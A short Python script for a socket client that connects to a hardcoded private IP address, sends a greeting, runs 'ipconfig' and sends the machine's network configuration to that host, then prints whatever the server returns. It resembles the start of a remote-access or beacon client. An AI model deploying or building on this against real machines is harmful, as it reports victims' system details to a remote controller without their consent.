import socket
import subprocess


class MClient:
    def __init__(self, host='10.53.2.41', port=840):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((host, port))
        self.send_greeting()
        self.send_ip_info()
        while True:
            print(self.receive_data())

    def send_data(self, data):
        self.client_socket.sendall(data.encode())

    def receive_data(self):
        return self.client_socket.recv(1024).decode()

    def send_greeting(self):
        self.send_data("Foreplay is coming in hot.")

    def send_ip_info(self):
        IP_STOFF = subprocess.run(["ipconfig"], encoding="UTF-8", capture_output=True)
        self.client_socket.sendall(IP_STOFF.stdout.encode())


if __name__ == '__main__':
    client = MClient()
